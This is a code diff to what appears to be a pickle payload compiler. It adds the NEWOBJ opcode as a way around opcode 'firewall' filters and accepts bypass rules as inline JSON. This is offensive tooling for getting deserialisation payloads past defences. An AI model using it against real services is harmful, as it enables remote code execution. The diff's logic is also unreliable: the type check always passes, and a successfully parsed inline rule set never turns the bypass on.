@@ -82,6 +82,7 @@ class Opcodes:
     SETITEMS = b'u'
     BUILD = b'b'
     EMPTY_DICT = b'}'
+    NEWOBJ = b'\x81'
 
 
 class Visitor(ast.NodeVisitor):
@@ -543,7 +544,38 @@ class Visitor(ast.NodeVisitor):
             self._error(node.func, f"this instance call is not supported yet: {node.func.__class__.__name__}")
             return b""
 
+        def _can_newobj(node: ast.Call) -> bool:
+            if node.keywords:
+                # NEWOBJ does not support keyword args
+                return False
+
+            func = node.func
+
+            def _is_builtin_type(name: str) -> bool:
+                obj = getattr(builtins, name, None)
+                if not isinstance(obj, type):
+                    print(put_color("[!] NEWOBJ (\\x81) only supports type (class), so bypass may be failed\n", "yellow"))
+                return True
+
+            if isinstance(func, ast.Name):
+                return _is_builtin_type(func.id)
+
+            if isinstance(func, ast.Attribute):
+                if isinstance(func.value, ast.Name) and func.value.id == "builtins":
+                    return _is_builtin_type(func.attr)
+
+            return False
+
+        def _newobj_generate(node) -> bytes:
+            # NEWOBJ: cls args_tuple \x81
+            func_opcode = self._flat(node.func)
+            args_opcode = Opcodes.MARK + b"".join([self._flat(arg) for arg in node.args]) + Opcodes.TUPLE
+            return func_opcode + args_opcode + Opcodes.NEWOBJ
+
         opcodes = [Opcodes.REDUCE, Opcodes.OBJ, Opcodes.INST]
+        if _can_newobj(node):
+            opcodes.append(Opcodes.NEWOBJ)
+
         choice = self._check_firewall(opcodes, node=node)
 
         if choice == Opcodes.REDUCE:
@@ -552,6 +584,8 @@ class Visitor(ast.NodeVisitor):
             return _obj_generate(node)
         elif choice == Opcodes.INST:
             return _instance_generate(node)
+        elif choice == Opcodes.NEWOBJ:
+            return _newobj_generate(node)
         
         self._error(node, "unsupported call bypass choice")
         return b""
@@ -820,14 +854,17 @@ def cli() -> None:
     bypass = False
     if args.bypass:
         try:
-            firewall_rules = json.load(open(args.bypass, encoding='utf-8'))
+            firewall_rules = json.loads(args.bypass)
         except Exception as e:
-            print("\n[!]", put_color(f"{args.bypass} has invalid bypass rules: {e}\n", 'yellow'))
-        else:
-            if not firewall_rules:
-                print("\n[!]", put_color(f"{args.bypass} has no rules\n", 'yellow'))
+            try:
+                firewall_rules = json.load(open(args.bypass, encoding='utf-8'))
+            except Exception as e:
+                print("\n[!]", put_color(f"{args.bypass} has invalid bypass rules: {e}\n", 'yellow'))
             else:
-                bypass = True
+                if not firewall_rules:
+                    print("\n[!]", put_color(f"{args.bypass} has no rules\n", 'yellow'))
+                else:
+                    bypass = True
 
     print(f'[*] try bypass:        {put_color(args.bypass, ["gray", "cyan"][int(bypass)])}')
     print(f'[*] transfer function: {put_color(transfer, ["blue", "gray"][bool(bypass)])}\n')
